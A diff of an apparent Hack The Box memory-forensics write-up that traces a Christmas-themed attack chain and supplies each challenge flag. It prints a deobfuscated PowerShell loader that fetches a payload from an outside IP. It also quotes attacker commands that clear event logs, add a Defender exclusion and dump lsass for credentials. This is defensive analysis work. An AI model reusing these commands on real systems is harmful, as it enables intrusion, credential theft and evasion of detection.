@@ -40,7 +40,7 @@ This is a memory dump, and we need to use [Volatility](https://github.com/volati
 This question was puzzling me for quite some time, but I knew I had to find some files at least - and usually files are copied/downloaded to the `C:\Users` and then `AppData`, `Desktop`, `Documents` or `Downloads`.
 
 {% highlight powershell %}
-PS> python volatility3-develop\vol.py -f optinseltrace3\santaclaus.bin windows.filescan | sls 'Users'
+python volatility3-develop\vol.py -f optinseltrace3\santaclaus.bin windows.filescan | sls 'Users'
 Progress:  100.00               PDB scanning finished
 ... TRUNCATED ...
 0xa48df8fb42a0  \Users\santaclaus\Desktop\present_for_santa.zip 216
@@ -52,14 +52,14 @@ Progress:  100.00               PDB scanning finished
 This yields some interesting files, a file called `present_for_santa.zip` and `present.exe`. Let's see if we can salvage those.
 
 {% highlight powershell %}
-PS> python volatility3-develop\vol.py -f optinseltrace3\santaclaus.bin windows.dumpfiles --virtaddr 0xa48df8fb42a0
+python volatility3-develop\vol.py -f optinseltrace3\santaclaus.bin windows.dumpfiles --virtaddr 0xa48df8fb42a0
 Volatility 3 Framework 2.5.2
 Progress:  100.00               PDB scanning finished
 Cache   FileObject      FileName        Result
 
 DataSectionObject       0xa48df8fb42a0  present_for_santa.zip   file.0xa48df8fb42a0.0xa48dfbf1ba20.DataSectionObject.present_for_santa.zip.dat
 
-PS> python volatility3-develop\vol.py -f optinseltrace3\santaclaus.bin windows.dumpfiles --virtaddr 0xa48df8fd7520
+python volatility3-develop\vol.py -f optinseltrace3\santaclaus.bin windows.dumpfiles --virtaddr 0xa48df8fd7520
 Volatility 3 Framework 2.5.2
 Progress:  100.00               PDB scanning finished
 Cache   FileObject      FileName        Result
@@ -67,9 +67,9 @@ Cache   FileObject      FileName        Result
 DataSectionObject       0xa48df8fd7520  present.exe     file.0xa48df8fd7520.0xa48dfe212c30.DataSectionObject.present.exe.dat
 ImageSectionObject      0xa48df8fd7520  present.exe     file.0xa48df8fd7520.0xa48dff93a270.ImageSectionObject.present.exe.img
 
-PS> fil .\file.0xa48df8fb42a0.0xa48dfbf1ba20.DataSectionObject.present_for_santa.zip.dat
+fil .\file.0xa48df8fb42a0.0xa48dfbf1ba20.DataSectionObject.present_for_santa.zip.dat
 .\file.0xa48df8fb42a0.0xa48dfbf1ba20.DataSectionObject.present_for_santa.zip.dat:   Zip archive data
-PS> fil .\file.0xa48df8fd7520.0xa48dfe212c30.DataSectionObject.present.exe.dat
+fil .\file.0xa48df8fd7520.0xa48dfe212c30.DataSectionObject.present.exe.dat
 .\file.0xa48df8fd7520.0xa48dfe212c30.DataSectionObject.present.exe.dat:   MS PE32+ executable console x86-64
 {% endhighlight %}
 
@@ -81,13 +81,13 @@ Either way, we've pulled two files out from the memory dump with Volatility, so 
 
 Well, this looks suspiciously like a payload. I think this zip file is the one of the first things in the attack chain.
 
-| **Answer for #1** | `present_for_santa.zip` |
+{% include htb_flag.html id="1" description="What is the name of the file that is likely copied from the shared folder (including the file extension)?" flag="present_for_santa.zip" %}
 
 ### 2. What is the file name used to trigger the attack (including the file extension)?
 
 When we are looking at the zip contents, we see a `lnk` shortcut file, and a `VB Script` file. Let's check out the shortcut file with [LECmd](https://ericzimmerman.github.io/#!index.md):
 {% highlight powershell %}
-PS> LECmd.exe -f .\click_for_present.lnk
+LECmd.exe -f .\click_for_present.lnk
 LECmd version 1.5.0.0
 
 ... TRUNCATED ...
@@ -110,20 +110,20 @@ $file = Get-ChildItem -Path "C:\Users\" -Filter "present*.vbs" -File -Recurse| S
 
 Think we got it. 
 
-| **Answer for #2** | `click_for_present.lnk` |
+{% include htb_flag.html id="2" description="What is the file name used to trigger the attack (including the file extension)?" flag="click_for_present.lnk" %}
 
 ### 3. What is the name of the file executed by click_for_present.lnk (including the file extension)?
 
 We did most of the work during the last question, we know which files are being executed (esentially any file starting with `present` and ending with `.vbs` in the users folder)
 
-| **Answer for #3** | `present.vbs` |
+{% include htb_flag.html id="3" description="What is the name of the file executed by click_for_present.lnk (including the file extension)?" flag="present.vbs" %}
 
 ### 4. What is the name of the program used by the vbs script to execute the next stage?
 
 If we check the first 10 lines of the vbs script, we can see something that is slightly annoying
 
 {% highlight powershell %}
-PS> Get-Content -Head 10 -Path .\present.vbs
+Get-Content -Head 10 -Path .\present.vbs
 Nonphilosophicalgloriat = LenB("Ritualizing")
 
 'Monetizing25 Muting
@@ -140,7 +140,7 @@ For one, there is words here that are Danish, so I can't help but read them when
 Other than that, comments in vbs starts with a single qoute `'` or `rem` - so let's remove all lines starting with a comment and empty lines.
 
 {% highlight powershell %}
-PS> Get-Content -Path .\present.vbs | sls -NotMatch "'" | sls -NotMatch "^$"
+Get-Content -Path .\present.vbs | sls -NotMatch "'" | sls -NotMatch "^$"
 
 Nonphilosophicalgloriat = LenB("Ritualizing")
 Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
@@ -249,14 +249,14 @@ Often with obfuscation, the author likes to thrown in a bunch of random informat
 
 I notice a few things here, mainly `Aadselsbilles = "power" & Unrustling & "hell "` - this gets translated into `powershell`, and we also see the final line `Firklverne.Run Aadselsbilles + Chr(34) + A4 + Chr(34),0` which translates roughly into `powershell "$A4"`. 34 is the ASCII character for double quotes, and A4 in our VB Script seems like the interesting part. Let's make a note of that and answer which file is being executed.
 
-| **Answer for #4** | `powershell.exe` |
+{% include htb_flag.html id="4" description="What is the name of the program used by the vbs script to execute the next stage?" flag="powershell.exe" %}
 
 ### 5. What is the name of the function used for the powershell script obfuscation?
 
 We have already figured out that A4 is something we are looking for, let's find all lines referencing A4.
 
 {% highlight powershell %}
-PS> (Get-Content -Path .\present.vbs | sls 'A4') -replace "'.*"
+(Get-Content -Path .\present.vbs | sls 'A4') -replace "'.*"
 A4 = A4 + "FunctGRINCHon W"
 A4 = A4 + "rapPresent ($En"
 A4 = A4 + "sproglGRINCHg){"
@@ -271,14 +271,14 @@ Looking at it, it seems like we need to concatenate all the A4 strings into a si
 
 {% highlight powershell %}
 
-PS> (Get-Content -Path .\present.vbs | sls 'A4 = A4 \+') -replace "`"'.*","`"" -replace 'A4 = A4 \+ ' -replace '"' -join '' -replace "GRINCH","i"
+(Get-Content -Path .\present.vbs | sls 'A4 = A4 \+') -replace "`"'.*","`"" -replace 'A4 = A4 \+ ' -replace '"' -join '' -replace "GRINCH","i"
 Function WrapPresent ($Ensproglig){$Nringsvirksomhedernes = $Ensproglig.Length-1; For ($Smiths211=6; $Smiths211 -lt $Nringsvirksomhedernes){$Malice=$Malice+$Ensproglig.Substring($Smiths211, 1);$Smiths211+=7;}$Malice;};$present=WrapPresent 'Once uhon a ttme, intthe whpmsical:town o/ Holid/y Holl7w, the7e live. two l7gendar4 figur.s know1 far a9d wide8 the G.inch a5d Sant2 Claus/ They desidedeon oppssite stdes ofrthe toon, eacy with _heir ocn uniqhe charrcterisiics thst defited them. The arinch,sa soli/ary creature,vdwellei in a lave at_p Mounp Crumprt. Wite his gseen fue and anheart teeming.y two jizes tpo smalg, he h';$gluhwein=WrapPresent 'd a peichant eor misxhief a';. ($gluhwein) (WrapPresent in fpr anyteing fertive. se despesed thn joyout celebLationsothat echoed tarough the towi, espeoially nuring =he win$er holedays. nn the vther s:de of tolidayeHollowm nestlpd in ac');$File=WrapPresent 'cozy w\rkshoppat therNorth eole, lsved the jollynand betevolen. SantaeClaus.xWith hes roun';. ($gluhwein) (WrapPresent ' belly$ rosy pheeks,eand a reart bsimmingewith knndnesst he spLnt hisodays ccaftingatoys ftr chiliren around thn world=and sp$eadingpcheer eherever he west. Yeae afternyear, ts the Lolidayoseasoncapproaahed, tte townifolk eogerly nrepare+ for f$stivitFes, adirning lhe streets wih');. ($gluhwein) (WrapPresent 'h ligh.s, set ing up$decoragions, lnd sinuing johful tuwes. Whele Sania businy prep red hi( sleigN and ceecked wis lis- twiceO the Gbinch sjethed en his cave, itritate  by thn merrieent thtt fill.d the wir. One fatefbl wintcr, a plrticulirly ice chillnswept through)Holida. HolloD, causong chaws and nisruptlng theoholidaa spirid. The Fnowstoims grel wildee, and (he tow$sfolk ptrugglrd to keep thesr festeve tranitionstalive.,Childr$n werepdisappeinted rs the srospece of a noyous telebraLion diomed. Wctnessiag the towns distresso Santanknew h) had t; do soe');. ($gluhwein) (WrapPresent 'ethingSto restore tha holidry cheet. With-a twinPle in ris eyeoand a ceart fell of sope, hs decid d to p$y a vipit to ehe Grirch, hosing toewarm hns heart and bLing baok the cpirit af the teason.iGuidedoby hisnunyiel;i');
 
 {% endhighlight %}
 
-At a glance, I only spot one function `WrapPresent`
+At a glance, I only spot one function `WrapPresent`.
 
-| **Answer for #5** | `WrapPresent` |
+{% include htb_flag.html id="5" description="What is the name of the function used for the powershell script obfuscation?" flag="WrapPresent" %}
 
 ### 6. What is the URL that the next stage was downloaded from?
 
@@ -303,7 +303,7 @@ http://77.74.198.52/destroy_christmas/evil_present.jpg
 
 We found the content of the `$present` variable, which is fetched by another function.
 
-| **Answer for #6** | `http://77.74.198.52/destroy_christmas/evil_present.jpg` |
+{% include htb_flag.html id="6" description="What is the URL that the next stage was downloaded from?" flag="http://77.74.198.52/destroy_christmas/evil_present.jpg" %}
 
 ### 7. What is the IP and port that the executable downloaded the shellcode from (IP:Port)?
 We can turn to [Ghidra](https://ghidra-sre.org/) when we need to reverse an application or simply upload this file to a site like VirusTotal and see the sockets the application creates.
@@ -314,32 +314,32 @@ We could also run the file on a device behind a [REMnux](https://remnux.org/) ma
 NOTE: user `tmechen` had a bit more luck with analyzing in Ghidra and provided a screenshot which shows the usage of [htons()](https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-htons) function, which indeed is the port number as previously assumed.
 ![present_port](/img/htb/sherlock/optinseltrace-3/present_port.png)
 
-| **Answer for #6** | `77.74.198.52:445` |
+{% include htb_flag.html id="7" description="What is the IP and port that the executable downloaded the shellcode from (IP:Port)?" flag="77.74.198.52:445" %}
 
 ### 8. What is the process ID of the remote process that the shellcode was injected into?
 
 If we again turn to Volatility, and check the network connections with the `windows.netscan` module, and search for the IP from which the shellcode was acquired
 
 {% highlight powershell %}
-PS> python volatility3-develop\vol.py -f optinseltrace3\santaclaus.bin windows.netscan | sls '77\.74\.198\.52'
+python volatility3-develop\vol.py -f optinseltrace3\santaclaus.bin windows.netscan | sls '77\.74\.198\.52'
 Progress:  100.00               PDB scanning finished
 0xa48df88db790  TCPv4   192.168.68.6    49687   77.74.198.52    447     ESTABLISHED     724     svchost.exe     2023-11-30 16:42:41.000000
 {% endhighlight %}
 
 The 8th column is our Process ID / PID.
 
-| **Answer for #8** | `724` |
+{% include htb_flag.html id="8" description="What is the process ID of the remote process that the shellcode was injected into?" flag="724" %}
 
 ### 9. After the attacker established a Command & Control connection, what command did they use to clear all event logs?
 
 We need to find out which command was run, and if we use the `windows.cmdline` module, it will only show the processed that were running at the time. The question indicates something was done prior to the data collection. So let's see if we can find a suiting Windows Eventlog in the filescan module.
 
 {% highlight powershell %}
-PS> python volatility3-develop\vol.py -f optinseltrace3\santaclaus.bin windows.filescan | sls evtx
+python volatility3-develop\vol.py -f optinseltrace3\santaclaus.bin windows.filescan | sls evtx
 Progress:  100.00               PDB scanning finished
 0xa48dfefe6e50  \Windows\System32\winevt\Logs\Windows PowerShell.evtx   216
 
-PS> python volatility3-develop\vol.py -f optinseltrace3\santaclaus.bin windows.dumpfiles --virtaddr 0xa48dfefe6e50
+python volatility3-develop\vol.py -f optinseltrace3\santaclaus.bin windows.dumpfiles --virtaddr 0xa48dfefe6e50
 Volatility 3 Framework 2.5.2
 Progress:  100.00               PDB scanning finished
 Cache   FileObject      FileName        Result
@@ -351,7 +351,7 @@ SharedCacheMap  0xa48dfefe6e50  Windows PowerShell.evtx file.0xa48dfefe6e50.0xa4
 
 Lets rename the file so we can open it with `Get-WinEvent`
 {% highlight powershell %}
-PS> mv '.\file.0xa48dfefe6e50.0xa48dfef8b010.SharedCacheMap.Windows PowerShell.evtx.vacb' '.\file.0xa48dfefe6e50.0xa48dfef8b010.SharedCacheMap.Windows PowerShell.evtx'
+mv '.\file.0xa48dfefe6e50.0xa48dfef8b010.SharedCacheMap.Windows PowerShell.evtx.vacb' '.\file.0xa48dfefe6e50.0xa48dfef8b010.SharedCacheMap.Windows PowerShell.evtx'
 {% endhighlight %}
 
 Once again I descend into oneliner hell. Sorry.
@@ -388,20 +388,20 @@ HostApplication=powershell.exe Get-EventLog -List | ForEach-Object { Clear-Event
 
 In any case, the last command is what we are looking for.
 
-| **Answer for #9** | `Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }` |
+{% include htb_flag.html id="9" description="After the attacker established a Command & Control connection, what command did they use to clear all event logs?" flag="Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }" %}
 
 ### 10. What is the full path of the folder that was excluded from defender?
 
 From our output in #9, we also get the answer by the command `Add-MpPreference`
 
-| **Answer for #10** | `C:\users\public` |
+{% include htb_flag.html id="10" description="What is the full path of the folder that was excluded from defender?" flag="C:\users\public" %}
 
 ### 11. What is the original name of the file that was ingressed to the victim?
 
 If we read the next question, we get the answer. But what we should be doing, would be to extract the file from memory and investigate it with [PEStudio](https://www.winitor.com) or similar.
 
 {% highlight powershell %}
-PS> python volatility3-develop\vol.py -f optinseltrace3\santaclaus.bin windows.dumpfiles --virtaddr 0xa48e00d10a90
+python volatility3-develop\vol.py -f optinseltrace3\santaclaus.bin windows.dumpfiles --virtaddr 0xa48e00d10a90
 Volatility 3 Framework 2.5.2
 Progress:  100.00               PDB scanning finished
 Cache   FileObject      FileName        Result
@@ -412,14 +412,13 @@ ImageSectionObject      0xa48e00d10a90  PresentForNaughtyChild.exe      file.0xa
 
 ![ProcDump](/img/htb/sherlock/optinseltrace-3/procdump.png)
 
-
-| **Answer for #11** | `procdump.exe` |
+{% include htb_flag.html id="11" description="What is the original name of the file that was ingressed to the victim?" flag="procdump.exe" %}
 
 ### 12. What is the name of the process targeted by procdump.exe?
 
 This is also answered in #9, but the command `powershell.exe C:\Users\public\PresentForNaughtyChild.exe -accepteula -r -ma lsass.exe C:\Users\public\stolen_gift.dmp` tells us that they are creating a dump of the `lsass.exe` process.
 
-| **Answer for #12** | `lsass.exe` |
+{% include htb_flag.html id="12" description="What is the name of the process targeted by procdump.exe?" flag="lsass.exe" %}
 
 ## Congratulations
 
